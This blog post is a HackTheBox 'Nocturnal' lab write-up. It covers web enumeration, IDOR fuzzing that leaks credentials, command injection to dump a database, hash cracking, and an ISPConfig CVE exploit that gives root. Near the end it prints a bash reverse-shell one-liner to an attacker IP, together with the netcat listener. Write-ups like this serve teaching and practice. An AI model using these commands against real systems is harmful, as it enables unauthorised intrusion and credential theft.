---
title: HackTheBox -Nocturnal
author: Bonface
date: 2025-08-16 00:00:00 +0000
categories:
  - HackTheBox
  - Machines
tags:
  - HackTheBox
  - linux
  - web
  - f
  - feroxbuster
  - idor
  - command-injection
  - burp
image:
  path: /assets/img/HTB/Machines/nocturnal/nocturnal.png
  alt: nocturnal.htb
---

<div align="center"> <script src="https://app.hackthebox.com/profile/1670709"></script> </div>

---

Nocturnal hosts a web app with an IDOR that lets me access other users’ files and ultimately expose the admin password. Inside the admin interface I discover a command-injection flaw in the backup utility, which I exploit to gain an initial foothold. After cracking a captured hash to obtain the next user’s credentials, I escalate to root by abusing a PHP code-injection vulnerability in an ISPConfig instance to achieve code execution and an interactive shell.
# Enumeration
## port scan

```bash
 nmap -sC -sV -vv -p22,80 10.129.72.217 -o nmap/Nocturnal

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpf3JJv7Vr55+A/O4p/l+TRCtst7lttqsZHEA42U5Edkqx/Kb8c+F0A4wMCVOMqwyR/PaMdmzAomYGvNYhi3NelwIEqdKKnL+5svrsStqb9XjyShPD9SQK5Su7xBt+/TfJyJFRcsl7ZJdfc6xnNHQITvwa6uZhLsicycj0yf1Mwdzy9hsc8KRY2fhzARBaPUFdG0xte2MkaGXCBuI0tMHsqJpkeZ46MQJbH5oh4zqg2J8KW+m1suAC5toA9kaLgRis8p/wSiLYtsfYyLkOt2U+E+FZs4i3vhVxb9Sjl9QuuhKaGKQN2aKc8ItrK8dxpUbXfHr1Y48HtUejBj+AleMrUMBXQtjzWheSe/dKeZyq8EuCAzeEKdKs4C7ZJITVxEe8toy7jRmBrsDe4oYcQU2J76cvNZomU9VlRv/lkxO6+158WtxqHGTzvaGIZXijIWj62ZrgTS6IpdjP3Yx7KX6bCxpZQ3+jyYN1IdppOzDYRGMjhq5ybD4eI437q6CSL20=
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLcnMmaOpYYv5IoOYfwkaYqI9hP6MhgXCT9Cld1XLFLBhT+9SsJEpV6Ecv+d3A1mEOoFL4sbJlvrt2v5VoHcf4M=
|   256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIASsDOOb+I4J4vIK5Kz0oHmXjwRJMHNJjXKXKsW0z/dy

80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```bash
 nmap -sC -sV -vv -p80 10.129.72.217 -o nmap/Nocturnal_port_80

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# web(80)
We visit the site
![image](https://gist.github.com/user-attachments/assets/7a0daedd-3595-4653-b68b-a903321066c4)
We get a link to register and create an account.
A directory scan  using `feroxbuster` gives some pages .

```bash
 feroxbuster -u http://nocturnal.htb

...[snip]...

404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      161l      327w     3105c http://nocturnal.htb/style.css
200      GET       21l       45w      644c http://nocturnal.htb/login.php
200      GET       21l       45w      649c http://nocturnal.htb/register.php
200      GET       29l      145w     1524c http://nocturnal.htb/
403      GET        7l       10w      162c http://nocturnal.htb/uploads
301      GET        7l       12w      178c http://nocturnal.htb/backups => http://nocturnal.htb/backups/
403      GET        7l       10w      162c http://nocturnal.htb/uploads_admin
403      GET        7l       10w      162c http://nocturnal.htb/uploads_user
403      GET        7l       10w      162c http://nocturnal.htb/uploads_group
403      GET        7l       10w      162c http://nocturnal.htb/uploads_video
403      GET        7l       10w      162c http://nocturnal.htb/uploads2
403      GET        7l       10w      162c http://nocturnal.htb/uploads_forum
403      GET        7l       10w      162c http://nocturnal.htb/uploads_event
403      GET        7l       10w      162c http://nocturnal.htb/uploads3

```
 To access this pages we need  a valid account.
 
 Register an account an login. ![image](https://gist.github.com/user-attachments/assets/a56c941f-97a2-44f5-87a4-b84ed065244e)
 
Uploaded a php reverse shell file and we get this error:
![image](https://gist.github.com/user-attachments/assets/18e0c06a-b50a-46e4-ac60-55af2c132ad6)

When we uploaded a valid file format.
![image](https://gist.github.com/user-attachments/assets/feac0515-5393-4b3e-97e4-1bc6ac283e03)

To downloads the file we can visit `http://nocturnal.htb/view.php?username=pentester&file=sample.odt`.  
The Url is querying the username and the file.We fuzz the user name to get other valid users.
```bash
   ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=*.pdf' -w names.txt -mc 200 -fr "User not found." -H "Cookie: PHPSESSID=n15rreakqu5qaatrmrgt4k0h1a"


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=*.pdf
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Cookie: PHPSESSID=n15rreakqu5qaatrmrgt4k0h1a
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Regexp: User not found.
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 439ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 262ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 235ms]

```

We have two more valid users `amanda` and `tobias` .  
Lets see the files amanda has.
```bash
 ffuf -u 'http://nocturnal.htb/view.php?username=amanda&file=FUZZ.odt' -w /usr/share/seclists/Discovery/DNS/namelist.txt -mc 200 -fr "File does not exist." -H "Cookie: PHPSESSID=n15rreakqu5qaatrmrgt4k0h1a"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=amanda&file=FUZZ.odt
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Cookie: PHPSESSID=n15rreakqu5qaatrmrgt4k0h1a
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Regexp: File does not exist.
________________________________________________

privacy                 [Status: 200, Size: 20477, Words: 66, Lines: 94, Duration: 484ms]
```

we download the file `http://nocturnal.htb/view.php?username=amanda&file=privacy.odt` to get a zip file.
```bash
 unzip privacy.odt -d amanda_privacy_extract/
Archive:  privacy.odt
 extracting: amanda_privacy_extract/mimetype  
   creating: amanda_privacy_extract/Configurations2/accelerator/
   creating: amanda_privacy_extract/Configurations2/images/Bitmaps/
   creating: amanda_privacy_extract/Configurations2/toolpanel/
   creating: amanda_privacy_extract/Configurations2/floater/
   creating: amanda_privacy_extract/Configurations2/statusbar/
   creating: amanda_privacy_extract/Configurations2/toolbar/
   creating: amanda_privacy_extract/Configurations2/progressbar/
   creating: amanda_privacy_extract/Configurations2/popupmenu/
   creating: amanda_privacy_extract/Configurations2/menubar/
  inflating: amanda_privacy_extract/styles.xml  
  inflating: amanda_privacy_extract/manifest.rdf  
  inflating: amanda_privacy_extract/content.xml  
  inflating: amanda_privacy_extract/meta.xml  
  inflating: amanda_privacy_extract/settings.xml  
 extracting: amanda_privacy_extract/Thumbnails/thumbnail.png  
  inflating: amanda_privacy_extract/META-INF/manifest.xml  

```

We use `grep` to get amanda's password  which is in the `content.xml` 
```json
...[snip]...
          {
            "span": {
              "_text:style-name": "T1",
              "__prefix": "text",
              "__text": "Amanda"
            },
            "_text:style-name": "P1",
            "__prefix": "text",
            "__text": "Dear \n,"
          },
          {
            "_text:style-name": "P1",
            "__prefix": "text",
            "__text": "Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure."
          },

...[snip]...
```
now we log in:
	`username` : `amanda`
	`password` : `arHkG7HAI68X8s1J`
![image](https://gist.github.com/user-attachments/assets/adc63337-4af6-4f05-b587-f6711c49df42)
Redirect to admin panel. 
![image](https://gist.github.com/user-attachments/assets/25ed333e-1385-42bc-9fc4-854029d744bf)

We get to create a backup as the admin.
```bash
 unzip backup_2025-04-17.zip -d admin_backup/
Archive:  backup_2025-04-17.zip
[backup_2025-04-17.zip] admin.php password: 
  inflating: admin_backup/admin.php  
   creating: admin_backup/uploads/
  inflating: admin_backup/uploads/privacy.odt  
  inflating: admin_backup/register.php  
  inflating: admin_backup/login.php  
  inflating: admin_backup/dashboard.php  
  inflating: admin_backup/index.php  
  inflating: admin_backup/view.php   
  inflating: admin_backup/logout.php  
  inflating: admin_backup/style.css  

```

One of the interesting files is `dashboard.php` 
```php
<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit();
}

$db = new SQLite3('../nocturnal_database/nocturnal_database.db');
$user_id = $_SESSION['user_id'];
$username = $_SESSION['username'];
...[snip]...
```

We get the path to the database file.  
Found RCE on the password field and run this sql command to read the database file.
```
bash -c	"sqlite3 /var/www/nocturnal_database/nocturnal_database.db .dump"
```

![image](https://gist.github.com/user-attachments/assets/c07d5ae7-3fd8-4897-8ac4-1e5ee314584c)

```sql
INSERT INTO users VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb');
INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4');
INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d');
```

we use hash cat to crack this passwords.
```bash
 cat hashes 
admin:d725aeba143f575736b07e045d8ceebb
amanda:df8b20aa0c935023f99ea58358fb63c4
tobias:55c82b1ccd55ab219b3b109b07d5061d

 hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt --username
...[snip]...

 hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt --username --show
tobias:55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse

```

Now we can ssh in as `tobias` : `slowmotionapocalypse`
```
tobias@nocturnal:~$ whoami
tobias
tobias@nocturnal:~$ id
uid=1000(tobias) gid=1000(tobias) groups=1000(tobias)

```

# Privilege Escalation
For privilege escalation `linpeas` showed some listening ports that we can enumerate but first we have to do some port forwarding.
```bash
tobias@nocturnal:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 0.0.0.0:68              0.0.0.0:*                          

```

Ssh port forwarding.
```bash
 ssh -L 9001:127.0.0.1:8080 tobias@nocturnal.htb 
```

Visiting the site we get a log in page of `ispconfig` .  
*ISPConfig is _an open source hosting control panel for Linux_, licensed under BSD license and developed by the company ISPConfig UG.*

![image](https://gist.github.com/user-attachments/assets/1f8075df-4316-48fe-8e2a-310d3dc9174a)

We login as admin using `tibias` ssh password exploiting password reuse.
![image](https://gist.github.com/user-attachments/assets/35b5d6d8-a375-4f83-9a00-fd602278f3d0)

Hunting for an exploit we get the service is vulnerable to `RCE` [CVE-2023-46818](https://github.com/bipbopbup/CVE-2023-46818-python-exploit) .
Running the exploit 
```bash
 python3 exploit.py http://127.0.0.1:9001 admin slowmotionapocalypse
[+] Target URL: http://127.0.0.1:9001/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell# whoami
root


ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)


ispconfig-shell# bash -c "bash -i >& /dev/tcp/10.10.16.32/1297 0>&1"

```

We get a stable shell on our machine that we can do some after root staff and get to understand the machine better.
```bash
 nc -nlvp 1297
listening on [any] 1297 ...
connect to [10.10.16.32] from (UNKNOWN) [10.129.74.233] 41288
bash: cannot set terminal process group (936): Inappropriate ioctl for device
bash: no job control in this shell
root@nocturnal:/usr/local/ispconfig/interface/web/admin# 

root@nocturnal:/usr/local/ispconfig/interface/web/admin# python3 -c 'import pty; pty.spawn("/bin/bash")'
<in# python3 -c 'import pty; pty.spawn("/bin/bash")'  
root@nocturnal:/usr/local/ispconfig/interface/web/admin# export TERM=xterm
export TERM=xterm
root@nocturnal:/usr/local/ispconfig/interface/web/admin#


```